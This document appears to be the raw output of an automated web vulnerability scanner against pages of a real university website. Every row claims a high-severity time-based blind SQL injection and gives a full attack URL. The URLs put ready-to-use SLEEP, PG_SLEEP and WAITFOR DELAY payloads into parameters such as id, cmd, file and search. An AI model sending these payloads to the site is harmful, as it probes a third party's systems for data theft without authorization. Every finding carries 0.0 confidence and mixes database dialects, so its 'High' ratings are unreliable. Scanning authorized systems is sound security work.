Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/admission-details/admission-procedure/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
